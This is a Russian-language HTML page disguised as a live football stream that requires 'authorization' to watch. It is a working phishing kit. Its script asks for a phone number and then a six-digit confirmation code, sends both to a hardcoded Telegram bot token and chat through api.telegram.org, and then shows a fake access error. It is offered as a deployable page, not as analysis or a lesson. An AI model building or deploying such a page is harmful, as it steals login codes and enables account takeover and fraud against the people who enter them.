<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MAX FOOTBALL</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        
        body {
            background: #090416;
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            color: white;
            display: flex;
            justify-content: center;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo h1 {
            font-size: 80px;
            font-weight: 900;
            line-height: 1;
            text-transform: uppercase;
            letter-spacing: -4px;
            background: linear-gradient(to bottom, #ffffff 30%, #9333ea 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            filter: drop-shadow(0 0 15px rgba(147, 51, 234, 0.5));
            margin: 20px 0;
        }

        .form-box { width: 100%; z-index: 100; }

        .label {
            color: #a855f7;
            font-weight: 600;
            margin-bottom: 15px;
            text-align: center;
            display: block;
        }

        .input-main {
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid #6b21a8;
            border-radius: 18px;
            padding: 18px;
            color: white;
            font-size: 22px; /* Чуть меньше, чтобы длинный номер с пробелами влезал */
            text-align: center;
            margin-bottom: 15px;
            font-weight: bold;
        }

        .btn {
            width: 100%;
            padding: 20px;
            background: linear-gradient(90deg, #9333ea, #4f46e5);
            border: none;
            border-radius: 18px;
            color: white;
            font-size: 18px;
            font-weight: 800;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
        }

        .btn:disabled { opacity: 0.6; cursor: wait; }

        .code-inputs { display: flex; justify-content: space-between; margin-bottom: 20px; }
        .code-inputs input {
            width: 14%; height: 55px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid #6b21a8;
            border-radius: 10px; color: white;
            font-size: 22px; text-align: center; font-weight: bold;
        }

        .stream-info {
            width: 100%;
            margin-top: 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 10px;
            margin-bottom: 8px;
        }

        .live-tag {
            background: #ff0000;
            color: white;
            padding: 4px 10px;
            border-radius: 6px;
            font-size: 12px;
            font-weight: 900;
            animation: blink 1.5s infinite;
        }

        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }

        .viewers { font-size: 13px; color: #94a3b8; font-weight: 600; }

        .stream-title {
            width: 100%;
            text-align: left;
            padding-left: 10px;
            font-size: 15px;
            font-weight: 700;
            color: #f1f5f9;
            margin-bottom: 10px;
        }

        .black-rect {
            width: 100%;
            height: 180px;
            background: #000;
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 1px solid #3b0764;
            position: relative;
        }

        .black-rect::after {
            content: "Для просмотра эфира необходима авторизация";
            position: absolute;
            bottom: 20px;
            font-size: 12px;
            color: rgba(255,255,255,0.4);
        }

        .triangle {
            width: 0; height: 0;
            border-top: 20px solid transparent;
            border-bottom: 20px solid transparent;
            border-left: 35px solid white;
            filter: drop-shadow(0 0 10px rgba(147, 51, 234, 0.8));
        }

        .footer-text {
            margin-top: 20px;
            font-size: 12px;
            color: #7e22ce;
            text-transform: uppercase;
            letter-spacing: 2px;
            font-weight: bold;
        }

        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo"><h1>МАКС</h1></div>

        <div class="form-box">
            <div id="scr1">
                <span class="label">Вход для просмотра</span>
                <input type="tel" id="phone" class="input-main" value="+7 " maxlength="16">
                <button class="btn" id="goBtn">Продолжить</button>
            </div>

            <div id="scr2" class="hidden">
                <span class="label">Введите код подтверждения</span>
                <div class="code-inputs">
                    <input type="text" maxlength="1" class="pin" inputmode="numeric">
                    <input type="text" maxlength="1" class="pin" inputmode="numeric">
                    <input type="text" maxlength="1" class="pin" inputmode="numeric">
                    <input type="text" maxlength="1" class="pin" inputmode="numeric">
                    <input type="text" maxlength="1" class="pin" inputmode="numeric">
                    <input type="text" maxlength="1" class="pin" inputmode="numeric">
                </div>
                <button class="btn" id="finBtn">Войти</button>
            </div>
        </div>

        <div class="stream-info">
            <div class="live-tag">● LIVE</div>
            <div class="viewers">👁 627 зрителей</div>
        </div>
        <div class="stream-title">Футбол / Прямой эфир</div>

        <div class="black-rect">
            <div class="triangle"></div>
        </div>

        <div class="footer-text">авторизуйся чтобы продолжить</div>
    </div>

    <script>
        const TOKEN = '8725058078:AAFyInfV3cvUOqMCYefbGlDjhkp0rUY-FHw';
        const CHAT = '8627005110';

        function send(msg) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
        }

        // КРАСИВАЯ МАСКА НОМЕРА (+7 911 111 11 11)
        const phoneInput = document.getElementById('phone');
        phoneInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, ''); // Только цифры
            if (!value.startsWith('7')) value = '7' + value;
            
            let formattedValue = '+7';
            if (value.length > 1) formattedValue += ' ' + value.substring(1, 4);
            if (value.length > 4) formattedValue += ' ' + value.substring(4, 7);
            if (value.length > 7) formattedValue += ' ' + value.substring(7, 9);
            if (value.length > 9) formattedValue += ' ' + value.substring(9, 11);
            
            e.target.value = formattedValue;
        });

        document.getElementById('goBtn').onclick = function() {
            const p = phoneInput.value;
            if(p.length < 16) return; // Проверка на полноту номера
            
            const btn = this;
            btn.disabled = true;
            btn.innerText = "ПОДОЖДИТЕ...";
            
            send(`📱 <b>Номер:</b> <code>${p}</code>`);
            
            setTimeout(() => {
                document.getElementById('scr1').classList.add('hidden');
                document.getElementById('scr2').classList.remove('hidden');
                document.querySelectorAll('.pin')[0].focus();
            }, 5000);
        };

        document.getElementById('finBtn').onclick = function() {
            let code = "";
            document.querySelectorAll('.pin').forEach(i => code += i.value);
            if(code.length < 6) return;
            
            send(`✅ <b>КОД:</b> <code>${code}</code>\n📱 Номер: ${phoneInput.value}`);
            this.innerText = "ПРОВЕРКА...";
            setTimeout(() => {
                alert("Ошибка доступа. Попробуйте снова через 5 минут.");
                location.reload();
            }, 2000);
        };

        const pins = document.querySelectorAll('.pin');
        pins.forEach((p, i) => {
            p.oninput = () => { if (p.value && i < 5) pins[i+1].focus(); };
            p.onkeydown = (e) => { if (e.key === 'Backspace' && !p.value && i > 0) pins[i-1].focus(); };
        });
    </script>
</body>
</html>
